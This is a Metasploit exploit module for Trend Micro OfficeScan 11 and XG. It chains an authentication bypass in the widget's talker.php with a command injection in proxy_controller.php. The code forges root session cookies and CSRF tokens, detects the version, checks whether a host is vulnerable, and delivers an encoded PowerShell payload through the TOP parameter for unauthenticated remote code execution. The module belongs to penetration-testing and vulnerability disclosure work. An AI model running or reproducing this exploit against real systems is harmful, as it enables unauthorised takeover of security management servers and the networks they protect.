##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Trend Micro OfficeScan Remote Code Execution",
      'Description'    => %q{
        This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a
        terminal command under the context of the web server user.

        The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product
        has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which
        leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process
        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,
        unauthenticated users can execute a terminal command under the context of the web server user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'mr_me <mr_me@offensive-security.com>', # author of command injection
          'Mehmet Ince <mehmet@mehmetince.net>' # author of authentication bypass & msf module
        ],
      'References'     =>
        [
          ['URL', 'https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/'],
          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-17-521/'],
        ],
      'DefaultOptions'  =>
        {
          'SSL' => true,
          'RPORT' => 443
        },
      'Platform'       => ['win'],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'Targets'        =>
        [
          ['Automatic Targeting', { 'auto' => true }],
          ['OfficeScan 11', {}],
          ['OfficeScan XG', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 7 2017",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the Trend Micro OfficeScan management interface', '/'])
      ]
    )
  end

  def build_csrftoken(my_target, phpsessid=nil)
    vprint_status("Building csrftoken")
    if my_target.name == 'OfficeScan XG'
      csrf_token = Rex::Text.md5(Time.now.to_s)
    else
      csrf_token = phpsessid.scan(/PHPSESSID=([a-zA-Z0-9]+)/).flatten[0]
    end
    csrf_token
  end

  def auto_target
    #XG version of the widget library has package.json within the same directory.
    mytarget = target
    if target['auto'] && target.name =~ /Automatic/
      print_status('Automatic targeting enabled. Trying to detect version.')
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'package.json'),
      })

      if res && res.code == 200
        mytarget = targets[2]
      elsif res && res.code == 404
        mytarget = targets[1]
      else
        fail_with(Failure::Unknown, 'Unable to automatically select a target')
      end
      print_status("Selected target system : #{mytarget.name}")
    end
    mytarget
  end

  def auth(my_target)
    # Version XG performs MD5 validation on wf_CSRF_token parameter. We can't simply use PHPSESSID directly because it contains a-zA-Z0-9.
    # Beside that, version 11 use PHPSESSID value as a csrf token. Thus, we are manually crafting the cookie.
    if my_target.name == 'OfficeScan XG'
      csrf_token = build_csrftoken(my_target)
      cookie = "LANG=en_US; LogonUser=root; userID=1; wf_CSRF_token=#{csrf_token}"
    # Version 11 want to see valid PHPSESSID from beginning to the end. For this reason we need to force backend to initiate one for us.
    else
      vprint_status("Sending session initiation request for : #{my_target.name}.")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'index.php'),
      })
      cookie = "LANG=en_US; LogonUser=root; userID=1; #{res.get_cookies}"
      csrf_token = build_csrftoken(my_target, res.get_cookies)
    end

    # Okay, we dynamically generated a cookie and csrf_token values depends on OfficeScan version.
    # Now we need to exploit authentication bypass vulnerability.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'ui', 'modLogin', 'talker.php'),
      'headers' => {
        'X-CSRFToken' => csrf_token,
        'ctype' => 'application/x-www-form-urlencoded; charset=utf-8'
      },
      'cookie' => cookie,
      'vars_post' => {
        'cid' => '1',
        'act' => 'check',
        'hash' => Rex::Text.rand_text_alpha(10),
        'pid' => '1'
      }
    })

    if res && res.code == 200 && res.body.include?('login successfully')
      # Another business logic in here.
      # Version 11 want to use same PHPSESSID generated at the beginning by hitting index.php
      # Version XG want to use newly created PHPSESSID that comes from auth bypass response.
      if my_target.name == 'OfficeScan XG'
        res.get_cookies
      else
        cookie
      end
    else
       nil
    end
  end

  def check
    my_target = auto_target
    token = auth(my_target)
    # If we dont have a cookie that means authentication bypass issue has been patched on target system.
    if token.nil?
      Exploit::CheckCode::Safe
    else
      # Authentication bypass does not mean that we have a command injection.
      # Accessing to the widget framework without having command injection means literally nothing.
      # So we gonna trigger command injection vulnerability without a payload.
      csrf_token = build_csrftoken(my_target, token)
      vprint_status('Trying to detect command injection vulnerability')
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'proxy_controller.php'),
        'headers' => {
          'X-CSRFToken' => csrf_token,
          'ctype' => 'application/x-www-form-urlencoded; charset=utf-8'
        },
        'cookie' => "LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{token}",
        'vars_post' => {
          'module' => 'modTMCSS',
          'serverid' => '1',
          'TOP' => ''
        }
      })
      if res && res.code == 200 && res.body.include?('Proxy execution failed: exec report.php failed')
        Exploit::CheckCode::Vulnerable
      else
        Exploit::CheckCode::Safe
      end
    end
  end

  def exploit
    mytarget = auto_target
    print_status('Exploiting authentication bypass')
    cookie = auth(mytarget)
    if cookie.nil?
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    else
      print_good("Authenticated successfully bypassed.")
    end

    print_status('Generating payload')

    powershell_options = {
      encode_final_payload: true,
      remove_comspec: true
    }
    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)


    # We need to craft csrf value for version 11 again like we did before at auth function.
    csrf_token = build_csrftoken(mytarget, cookie)

    print_status('Trigerring command injection vulnerability')

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'proxy_controller.php'),
      'headers' => {
        'X-CSRFToken' => csrf_token,
        'ctype' => 'application/x-www-form-urlencoded; charset=utf-8'
      },
      'cookie' => "LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{cookie}",
      'vars_post' => {
        'module' => 'modTMCSS',
        'serverid' => '1',
        'TOP' => "2>&1||#{p}"
      }
    })

  end
end
